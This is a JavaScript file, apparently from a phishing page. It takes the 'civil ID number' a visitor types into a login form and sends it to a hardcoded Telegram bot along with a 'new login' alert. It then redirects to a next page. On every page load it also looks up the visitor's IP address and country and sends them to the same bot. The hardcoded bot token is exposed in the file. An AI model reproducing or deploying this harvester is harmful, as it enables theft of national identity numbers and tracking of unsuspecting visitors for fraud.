document.getElementById("form1").addEventListener("submit", function(e) {
    e.preventDefault();  // منع الإرسال الافتراضي للنموذج

    const phone = document.getElementById("nomberform").value.trim();  // الحصول على الرقم المدني من المستخدم

    if (!phone) {
      alert("يرجى إدخال الرقم المدني.");
      return;
    }

    const token = "7847502445:AAGXYt3fTBBIXRQufdb_DrhkIrKO5oWuJng";
    const chatId = "7595871538";
    
    const message = `
      📥 تسجيل دخول جديد:
      📞 الرقم المدني: ${phone}
    `;

    // إرسال البيانات إلى تلجرام
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = "select.html";  // انتقل إلى الصفحة الجديدة بعد الإرسال
      } else {
        alert("فشل في إرسال البيانات.");
      }
    })
    .catch(error => {
      console.error("⚠️ خطأ في الاتصال:", error);
      alert("حدث خطأ أثناء الإرسال.");
    });
  });


  window.onload = function () {
    // استدعاء API خارجي لجلب موقع الزائر بناءً على IP
    fetch("https://ipapi.co/json/")
      .then(response => response.json())
      .then(data => {
        const country = data.country_name || "غير معروف";
        const ip = data.ip || "غير معروف";
  
        const token = "7847502445:AAGXYt3fTBBIXRQufdb_DrhkIrKO5oWuJng";
        const chatId = "7595871538";
  
        const message = `
  🌍 زيارة جديدة للموقع
  📍 الدولة: ${country}
  🌐 IP: ${ip}
  🕒 الوقت: ${new Date().toLocaleString()}
        `;
  
        // إرسال الرسالة إلى تليجرام
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      })
      .catch(error => {
        console.error("فشل في جلب موقع الزائر:", error);
      });
  };
